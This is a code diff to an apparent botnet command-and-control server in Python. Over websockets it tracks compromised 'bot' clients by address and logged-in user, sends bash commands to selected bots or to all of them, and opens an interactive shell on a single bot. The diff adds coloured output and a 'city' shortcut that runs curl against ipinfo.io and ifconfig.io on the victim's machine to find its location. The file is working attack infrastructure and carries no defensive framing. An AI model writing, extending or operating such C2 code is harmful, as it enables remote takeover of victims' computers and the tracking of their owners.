@@ -9,7 +9,7 @@ from utils import hash_sha256, is_num, Id, configure_logging
 import asyncio
 import websockets
 import logging
-
+import termcolor
 from websockets.server import WebSocketServerProtocol as WebSocketConn
 from websockets.exceptions import ConnectionClosedError
 
@@ -17,13 +17,13 @@ from websockets.exceptions import ConnectionClosedError
 logger = logging.getLogger(__name__)
 bot_length = 0
 
+CLI_OPTIONS  = f'{termcolor.colored("Enter:","red")}\n'
+CLI_OPTIONS += f'* "{termcolor.colored("0","yellow",attrs=["bold"])}" {termcolor.colored("- to print bot clients collection","red")}\n'
+CLI_OPTIONS += f'* {termcolor.colored("Indexes of clients separated by space to send bash command to","red")}\n'
+CLI_OPTIONS += f'* {termcolor.colored("Index of one client to jump into bash (send","red")} "{termcolor.colored("exit","yellow",attrs=["bold"])}" {termcolor.colored("for termination)","red")}\n'
+CLI_OPTIONS += f'* {termcolor.colored("Send","red")} "{termcolor.colored("all", "yellow",attrs=["bold"])}" {termcolor.colored("to send a single command for each bot","red")}\n'
 
-CLI_OPTIONS = f'Enter: \n' \
-    f'* "0" - to print bot clients collection\n' \
-    f'* Indexes of clients separated by space to send bash command to\n' \
-    f'* Index of one client to jump into bash (send "exit" for termination)\n'
-
-def isNotListed(ip, ip_list):
+def isNotListed(ip: str, ip_list: Bot) -> bool:
     for listed_ip in ip_list:
         if ip in str(listed_ip):
             #print(f'Type listed_ip : {type(str(listed_ip))}')
@@ -81,9 +81,9 @@ class Context:
 
     def get_database_summary(self) -> str:
         x = PrettyTable()
-        x.field_names = ["Index", "Remote address", "Logged as"]
+        x.field_names = [termcolor.colored("Index","yellow",attrs=["bold"]), termcolor.colored("Remote address","yellow",attrs=["bold"]), termcolor.colored("Logged as","yellow",attrs=["bold"])]
         for bot in self.bots:
-            x.add_row([bot.idx, bot.remote_address, bot.user])
+            x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
         return f"\n{x}"
 
 
@@ -96,24 +96,31 @@ class CommandControl:
         return pass_hash == self.ctx.pass_hash
 
     async def handle_bot(self, ws: WebSocketConn, _: str):
-        if not await self.bot_authenticated(ws):
-            logger.info(f"Bot client {ws.remote_address} not authenticated")
-            await ws.close()
-            return
-        bot = await self.ctx.add_bot(ws)
-        if bot:
-            await ws.keepalive_ping()
-            self.ctx.remove_bot_client(bot)
+        try:
+            if not await self.bot_authenticated(ws):
+                logger.info(f"Bot client {ws.remote_address} not authenticated")
+                await ws.close()
+                return
+            bot = await self.ctx.add_bot(ws)
+            if bot:
+                await ws.keepalive_ping()
+                self.ctx.remove_bot_client(bot)
+        except websockets.exceptions.ConnectionClosedOK:
+            pass
 
     async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
         global bot_length
-        await ws.send("Enter command:")
+        CLI_OPTIONS  = f'* {termcolor.colored("Send","red")} "{termcolor.colored("city", "yellow",attrs=["bold"])}" {termcolor.colored("to see current bot location","red")}\n'
+        CLI_OPTIONS += f'{termcolor.colored("Enter command : ","yellow", attrs=["bold"])}'
+        await ws.send(CLI_OPTIONS)
         cmd = await ws.recv()
+        if cmd == "city":
+            cmd = "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
 
         async def exec_command(bot_idx: int):
             cur_bot = self.ctx.get_bot(bot_idx)
             if not cur_bot:
-                await ws.send(f"Bot {bot_idx} does not exist")
+                #await ws.send(f"Bot {bot_idx} does not exist")
                 return
 
             stdout = await cur_bot.send_command(cmd)
@@ -122,7 +129,7 @@ class CommandControl:
                 await ws.send(
                     f"Connection with bot {cur_bot} was closed...")
             else:
-                stdout = f"Bot {bot_idx}:\n{stdout}"
+                stdout = f"Bot {termcolor.colored(bot_idx,'yellow',attrs=['bold'])} :\n {termcolor.colored(stdout,'green',attrs=['bold'])}"
                 await ws.send(stdout)
 
         # Execute all commands simultaneously in case it takes long time to
@@ -135,27 +142,28 @@ class CommandControl:
     async def start_bash(self, ws: WebSocketConn, bot_idx: int):
         bot = self.ctx.get_bot(bot_idx)
         if not bot:
-            await ws.send(f"Bot {bot_idx} does not exist")
+            #await ws.send(f"Bot {bot_idx} does not exist")
             return
 
         while True:
             cmd = await ws.recv()
             if cmd.strip("\n").lower() == "exit":
                 break
-
+            elif cmd == "city":
+                cmd = "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
             stdout = await bot.send_command(cmd)
             if ws.closed or stdout is False:
                 self.ctx.remove_bot_client(bot)
                 await ws.send(f"Connection with bot {bot.idx} was closed...")
                 break
 
-            await ws.send(stdout)
+            await ws.send(termcolor.colored(stdout, 'green',attrs=['bold']))
 
     async def handle_cli(self, cli_ws: WebSocketConn, _: str):
         logger.info("Command and control connection established")
         try:
             while True:
-                await cli_ws.send(CLI_OPTIONS)
+                await cli_ws.send(termcolor.colored(CLI_OPTIONS,'red'))
 
                 # To not care about empty lines
                 choice = None
